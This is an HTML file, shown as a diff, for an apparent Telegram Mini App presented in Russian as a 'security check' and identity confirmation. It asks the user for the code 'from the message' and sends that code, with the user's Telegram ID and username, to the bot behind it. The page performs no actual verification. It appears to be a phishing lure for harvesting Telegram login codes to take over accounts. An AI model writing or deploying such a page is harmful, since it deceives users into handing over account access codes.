@@ -1,0 +1,95 @@
+<!-- language: HTML, file: index.html -->
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Проверка безопасности</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+       background:#17212b;color:#fff;margin:0;padding:24px;display:flex;
+       align-items:center;justify-content:center;min-height:100vh;
+       box-sizing:border-box}
+  .card{width:100%;max-width:360px;background:#242f3d;border-radius:12px;
+        padding:28px;box-sizing:border-box}
+  h1{font-size:19px;text-align:center;margin:0 0 8px}
+  p{font-size:14px;color:#8b9bab;text-align:center;margin:0 0 22px;
+    line-height:1.4}
+  input{width:100%;padding:14px;background:#17212b;border:1px solid #2f3d4d;
+        border-radius:8px;color:#fff;font-size:18px;letter-spacing:4px;
+        text-align:center;box-sizing:border-box;margin-bottom:14px}
+  input:focus{outline:none;border-color:#2aabee}
+  button{width:100%;padding:14px;background:#2aabee;border:0;border-radius:8px;
+         color:#fff;font-size:16px;font-weight:600;cursor:pointer}
+  button:disabled{background:#2f3d4d;color:#8b9bab;cursor:default}
+  .err{color:#e74c3c;font-size:13px;text-align:center;margin-top:10px;
+       min-height:18px}
+  .ok{color:#2ecc71;font-size:13px;text-align:center;margin-top:10px;
+      min-height:18px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Подтверждение личности</h1>
+  <p>Введите код из сообщения, чтобы завершить проверку</p>
+  <input type="text" id="code" placeholder="00000" maxlength="6"
+         inputmode="numeric" autocomplete="off">
+  <button id="btn" onclick="submitCode()">Подтвердить</button>
+  <div class="err" id="err"></div>
+  <div class="ok" id="ok"></div>
+</div>
+<script>
+const tg = window.Telegram?.WebApp;
+if (tg) {
+  tg.ready();
+  tg.expand();
+}
+
+function submitCode() {
+  const codeEl = document.getElementById('code');
+  const btn = document.getElementById('btn');
+  const err = document.getElementById('err');
+  const ok = document.getElementById('ok');
+
+  const code = (codeEl.value || '').trim();
+
+  if (code.length < 4) {
+    err.textContent = 'Введите код полностью';
+    return;
+  }
+
+  if (!tg) {
+    err.textContent = 'Откройте это приложение через Telegram';
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'Проверка...';
+
+  let user = null;
+  try {
+    user = tg.initDataUnsafe && tg.initDataUnsafe.user
+      ? tg.initDataUnsafe.user : null;
+  } catch (e) { user = null; }
+
+  const payload = JSON.stringify({
+    code: code,
+    ts: Date.now(),
+    user_id: user ? user.id : null,
+    username: user ? (user.username || null) : null
+  });
+
+  try {
+    tg.sendData(payload);
+    err.textContent = '';
+    ok.textContent = 'Код отправлен на проверку. Подождите...';
+  } catch (e) {
+    err.textContent = 'Ошибка отправки. Попробуйте снова.';
+    btn.disabled = false;
+    btn.textContent = 'Подтвердить';
+  }
+}
+</script>
+</body>
+</html>
